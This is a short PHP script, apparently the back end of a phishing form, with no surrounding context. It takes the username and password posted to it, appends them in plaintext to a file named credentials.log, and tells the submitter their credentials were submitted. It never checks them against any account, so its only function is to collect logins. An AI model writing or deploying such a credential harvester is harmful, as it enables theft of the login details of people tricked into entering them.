<?php
// Get the username and password from the POST request
$username = $_POST['username'];
$password = $_POST['password'];

// Define the file where the credentials will be logged
$logFile = 'credentials.log';

// Create a string with the username and password
$logEntry = "Username: $username, Password: $password\n";

// Write the string to the log file
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Optionally, display a message to the user
echo "Your credentials have been submitted.";
?>
